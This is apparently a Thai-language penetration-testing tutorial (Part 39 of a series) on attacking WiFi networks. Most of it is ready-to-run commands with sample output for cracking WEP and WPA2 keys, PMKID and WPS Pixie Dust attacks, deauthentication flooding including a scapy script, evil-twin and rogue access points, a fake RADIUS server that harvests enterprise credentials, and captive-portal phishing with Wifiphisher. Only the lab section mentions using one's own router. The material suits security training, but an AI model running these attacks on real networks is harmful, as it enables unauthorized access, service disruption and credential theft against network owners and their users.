# Part 39: Wireless Security - WPA2, WEP, Evil Twin และการโจมตี WiFi

## สารบัญ
1. [Wireless พื้นฐาน](#1-wireless-พื้นฐาน)
2. [Monitor Mode และ Packet Injection](#2-monitor-mode-และ-packet-injection)
3. [WEP Cracking](#3-wep-cracking)
4. [WPA/WPA2 Cracking](#4-wpawpa2-cracking)
5. [PMKID Attack](#5-pmkid-attack)
6. [WPS Attack](#6-wps-attack)
7. [Evil Twin Attack](#7-evil-twin-attack)
8. [Deauthentication Attack](#8-deauthentication-attack)
9. [Rogue Access Point และ Captive Portal](#9-rogue-access-point-และ-captive-portal)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. Wireless พื้นฐาน

### WiFi Standards และ Security Protocols

```
WiFi Standards:
- 802.11b/g/n  = 2.4 GHz
- 802.11a/n/ac = 5 GHz
- 802.11ax (WiFi 6) = 2.4/5/6 GHz

Security Protocols (เรียงจากเก่าไปใหม่):
- WEP (Wired Equivalent Privacy)    -> ความปลอดภัยน้อยมาก, crack ได้ใน minutes
- WPA (Wi-Fi Protected Access)      -> ดีกว่า WEP, TKIP
- WPA2 Personal (PSK)               -> AES-CCMP, crack ได้ด้วย dictionary
- WPA2 Enterprise (EAP)             -> RADIUS server, ยาก crack
- WPA3                              -> ปลอดภัยที่สุด
```

### WiFi Adapter Requirements

```bash
# ต้องการ adapter ที่รองรับ:
# - Monitor mode
# - Packet injection

# ตรวจสอบ WiFi adapters
iwconfig
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated

ip link show
iw dev
# phy#0
#   Interface wlan0
#     ifindex 3
#     wdev 0x1
#     addr 00:11:22:33:44:55
#     type managed

# ตรวจสอบว่ารองรับ monitor mode
iw phy phy0 info | grep -A 10 'Supported interface modes'
# * IBSS
# * managed
# * AP
# * monitor  <-- ต้องมี

# Chipsets ที่รองรับ:
# - Alfa AWUS036ACH (RTL8812AU) - แนะนำ
# - Alfa AWUS036NHA (AR9271)
# - TP-Link TL-WN722N v1 (AR9271)
```

---

## 2. Monitor Mode และ Packet Injection

```bash
# เปิด Monitor Mode
irfkill unblock all

# วิธี 1: airmon-ng
airmon-ng check kill  # หยุด process ที่ขัด
airmon-ng start wlan0
# Found 2 processes that could cause trouble.
# Killing all of them...
# PHY  Interface  Driver  Chipset
# phy0  wlan0mon  rtl88xxau  Realtek Semiconductor Corp.

iwconfig wlan0mon
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz

# วิธี 2: iw
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
iw dev wlan0 info

# ทดสอบ Packet Injection
aireplay-ng -9 wlan0mon
# 09:00:00  Trying broadcast probe requests...
# 09:00:00  Injection is working!
# 09:00:00  Found 5 APs

# ปิด Monitor Mode (restore)
airmon-ng stop wlan0mon
service NetworkManager restart
```

### สแกนหา WiFi Networks

```bash
# Scan ด้วย airodump-ng
airodump-ng wlan0mon

# Output:
#  CH  1 ][ Elapsed: 30 s ][ 2026-09-28 10:00 
#
#  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
#
#  AA:BB:CC:DD:EE:01  -40       50      100    5   6  130   WPA2 CCMP   PSK  HomeWifi
#  AA:BB:CC:DD:EE:02  -60       30       50    2   1   54   WEP           WEP  OldNetwork
#  AA:BB:CC:DD:EE:03  -70       20       10    1  11  130   WPA2 CCMP   MGT  CorpWifi
#
#  STATION            PWR   Rate    Lost    Frames  Notes  Probes
#
#  11:22:33:44:55:01  -50    54e- 1e     0       50         HomeWifi

# Scan เฉพาะช่องคลื่นความถี่
# 2.4GHz
airodump-ng --band bg wlan0mon
# 5GHz
airodump-ng --band a wlan0mon
# Both
airodump-ng --band abg wlan0mon

# Focus เฉพาะ target AP
airodump-ng --bssid AA:BB:CC:DD:EE:01 -c 6 -w capture wlan0mon
```

---

## 3. WEP Cracking

```bash
# WEP สามารถ crack ได้โดยเก็บ IVs (Initialization Vectors)
# ต้องการ ~50,000-1,000,000 IVs

# Step 1: Capture packets
airodump-ng --bssid AA:BB:CC:DD:EE:02 -c 1 -w wep_capture wlan0mon

# Step 2: Fake Authentication (ทำให้ AP ยอมรับ connection)
aireplay-ng -1 0 -e OldNetwork -a AA:BB:CC:DD:EE:02 wlan0mon
# 10:00:00  Sending Authentication Request
# 10:00:00  Authentication successful
# 10:00:00  Sending Association Request
# 10:00:00  Association successful

# Step 3: ARP Replay (เพิ่มความเร็วในการเก็บ IVs)
aireplay-ng -3 -b AA:BB:CC:DD:EE:02 wlan0mon
# Read from arp frames and reinject
# Saving ARP requests in replay_arp-*.cap
# Sent 10000 packets...

# Step 4: Crack เมื่อมี IVs พอ
aircrack-ng wep_capture*.cap

# Output:
# KEY FOUND! [ 41:73:6B:4B:65:79 ]
# Decrypted correctly: 100%
```

---

## 4. WPA/WPA2 Cracking

### ดึง WPA2 Handshake

```bash
# Step 1: Capture บน channel ใดก็ได้
airodump-ng --bssid AA:BB:CC:DD:EE:01 -c 6 -w wpa_capture wlan0mon

# Step 2: รอ capture handshake จาก client ที่ontinue
# หรือ Force deauth (terminal ใหม่)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:01 wlan0mon
# 10:00:00  Sending 5 directed DeAuth. STMAC: [11:22:33:44:55:01]

# airodump-ng จะแสดง:
# WPA handshake: AA:BB:CC:DD:EE:01

# Step 3: Crack ด้วย aircrack-ng
aircrack-ng wpa_capture*.cap -w /usr/share/wordlists/rockyou.txt

# Output:
# [00:01:23] 100000 keys tested (1356.78 k/s)
# KEY FOUND! [ HomePassword123 ]
# Master Key     : AB CD EF 12 34 56 78 90 ...
# Transient Key  : ...
```

### Crack ด้วย hashcat (เร็วกว่า)

```bash
# แปลง .cap เป็น .hc22000
hcxpcapngtool -o capture.hc22000 wpa_capture*.cap

# Crack ด้วย hashcat
hashcat -m 22000 -a 0 capture.hc22000 /usr/share/wordlists/rockyou.txt

# ใช้ rules
hashcat -m 22000 -a 0 -r /usr/share/hashcat/rules/best64.rule capture.hc22000 rockyou.txt

# Brute force 8 digits (รหัสที่นิยมใช้)
hashcat -m 22000 -a 3 capture.hc22000 '?d?d?d?d?d?d?d?d'
```

---

## 5. PMKID Attack

```bash
# PMKID attack ไม่ต้องรอ client!
# PMKID อยู่ใน Beacon/Probe Response frame

# ติดตั้ง hcxdumptool
apt install hcxdumptool hcxtools

# เก็บ PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3

# เฝ้า BSSID เดียว
echo 'AABBCCDDEEFF' > filter.txt
hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=filter.txt --filtermode=2

# แปลงเป็น hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Output:
# 22000*AABBCCDDEEFF*112233445501*486f6d6557696669*...

# Crack
hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 6. WPS Attack

```bash
# WPS PIN Brute Force
# WPS PIN = 8 digits (10^8 = 100 million)
# แต่ Pixie Dust ทำให้ crack ใน seconds!

# reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -vv

# พร้อม Pixie Dust
reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -K 1 -vv

# Output:
# [+] Trying pin "12345670"
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'NetworkPassword'
# [+] AP SSID: 'HomeWifi'

# bully (alternative)
bully wlan0mon -b AA:BB:CC:DD:EE:01 -v 3

# สแกนหา AP ที่เปิด WPS
wash -i wlan0mon
# BSSID              Ch  dBm  WPS  Lck  ESSID
# AA:BB:CC:DD:EE:01   6  -40  2.0  No   HomeWifi
# AA:BB:CC:DD:EE:03  11  -70  1.0  Yes  CorpAP
```

---

## 7. Evil Twin Attack

```bash
# Evil Twin = สร้าง AP ที่ใช้ชื่อเดียวกับ AP จริง
# Victim เชื่อมต่อ แล้วถูกดักข้อมูล

# พื้นฐาน: ใช้ hostapd-wpe
apt install hostapd-wpe

cat > evil_twin.conf << 'EOF'
interface=wlan0
ssid=HomeWifi
channel=6
hw_mode=g
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

hostapd evil_twin.conf

# ตั้ง DHCP
apt install dnsmasq
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.100.2,192.168.100.254,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
EOF

ip addr add 192.168.100.1/24 dev wlan0
dnsmasq -C dnsmasq.conf

# เปิดใช้งาน IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### airbase-ng Evil Twin

```bash
# ง่ายกว่า
# Step 1: สร้าง rogue AP
airbase-ng -e 'HomeWifi' -c 6 wlan0mon
# Created tap interface at0

# Step 2: ตั้งค่า at0
ifconfig at0 192.168.100.1 netmask 255.255.255.0 up

# Step 3: DHCP
dnsmasq --no-daemon --interface=at0 \
  --dhcp-range=192.168.100.10,192.168.100.100,12h

# Step 4: Forward traffic
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# Step 5: Deauth ให้ clients disconnect จาก real AP
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:01 wlan0mon
```

---

## 8. Deauthentication Attack

```bash
# DoS ต่อ client
# -0 = deauth
# 10 = จำนวน packets (0 = continuous)
# -a = BSSID (AP)
# -c = client MAC (broadcast ถ้าไม่ระบุ)

# Deauth ผู้ใช้คนเดียว
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:01 wlan0mon

# Deauth ทุกคน (broadcast)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 wlan0mon

# MDK4 - aggressive deauth
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:01

# ใช้ scapy
python3 << 'EOF'
from scapy.all import *

def deauth(ap_mac, client_mac, iface='wlan0mon', count=10):
    # Deauth frame
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    deauth = Dot11Deauth(reason=7)
    frame = RadioTap() / dot11 / deauth
    
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
    print(f"Sent {count} deauth frames to {client_mac}")

deauth('AA:BB:CC:DD:EE:01', '11:22:33:44:55:01')
EOF
```

---

## 9. Rogue Access Point และ Captive Portal

### WPA2 Enterprise Attack

```bash
# หากเป้าหมายเป็น WPA2-Enterprise (PEAP/EAP-TTLS)
# สร้าง rogue AP พร้อม fake RADIUS server

# hostapd-wpe (WPA2 Enterprise)
apt install hostapd-wpe

cat > hostapd-wpe.conf << 'EOF'
interface=wlan0
ssid=CorpWifi
channel=11
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
private_key_passwd=
dh_file=/etc/hostapd/dh
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
EOF

hostapd-wpe hostapd-wpe.conf

# Client เชื่อมต่อ hostapd-wpe จะแสดง:
# hostapd-wpe: 192.168.1.100 username: john.doe
# hostapd-wpe: 192.168.1.100 challenge:  aabbccdd
# hostapd-wpe: 192.168.1.100 response: eeff0011...

# Crack NTHash ด้วย asleap
asleap -C aa:bb:cc:dd -R ee:ff:00:11:... -W /usr/share/wordlists/rockyou.txt
```

### Captive Portal Phishing

```bash
# ใช้ WiFi-Pumpkin3 หรือ Wifiphisher

# Wifiphisher
apt install wifiphisher
wifiphisher

# เลือก scenario:
# 1. Firmware Upgrade Page (fake router upgrade)
# 2. OAuth Login Page (Facebook/Google)
# 3. Browser Plugin Update
# 4. Network Manager Connect

# เมื่อ victim ใส่ password:
# [*] Victim: 192.168.0.101 GET http://wifiphisher.org/
# [*] POST: username=admin&password=MyWifiPassword
# [+] Credentials collected: admin / MyWifiPassword
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: WPA2 Handshake Capture + Crack

```bash
# Setup lab:
# - AP: Own router หรือ virtual AP
# - Monitor mode enabled

# Step 1: เปิด monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Step 2: Scan
airodump-ng wlan0mon

# Step 3: Capture
airodump-ng --bssid TARGET_BSSID -c CHANNEL -w lab1_capture wlan0mon

# Step 4: Deauth + Capture handshake
aireplay-ng -0 5 -a TARGET_BSSID wlan0mon

# Step 5: Crack
hcxpcapngtool -o lab1.hc22000 lab1_capture*.cap
hashcat -m 22000 -a 0 lab1.hc22000 /usr/share/wordlists/rockyou.txt
```

### Lab 2: WPS Pixie Dust

```bash
# หา AP ที่เปิด WPS
wash -i wlan0mon

# Pixie Dust attack
reaver -i wlan0mon -b TARGET_BSSID -K 1 -vv

# หาก Pixie Dust ไม่สำเร็จ ลอง PIN brute force
reaver -i wlan0mon -b TARGET_BSSID -vv -d 2
```

---

## สรุป

| เครื่องมือ | ใช้สำหรับ | Protocol |
|-----------|-----------|----------|
| airmon-ng | Monitor mode | - |
| airodump-ng | Capture/Scan | WiFi |
| aireplay-ng | Injection/Deauth | WiFi |
| aircrack-ng | Crack WEP/WPA | WEP/WPA |
| hashcat | GPU crack | WPA2 |
| hcxdumptool | PMKID capture | WPA2 |
| reaver | WPS attack | WPS |
| wifiphisher | Captive portal | All |
| hostapd-wpe | Fake EAP server | WPA2-Enterprise |

| Protocol | ความยากในการโจมตี |
|----------|---------------------|
| WEP | ง่ายมาก (minutes) |
| WPA-TKIP | ง่าย-ปานกลาง |
| WPA2-PSK | ยาก (ขึ้นอยู่กับ password) |
| WPS | ง่าย (ถ้า Pixie Dust works) |
| WPA2-Enterprise | ยาก (ต้อง fake RADIUS) |
| WPA3 | ยากมาก |

---

**ต่อไป:** [Part 40 - Buffer Overflow Basics](Part-40-Buffer-Overflow-Basics.md)
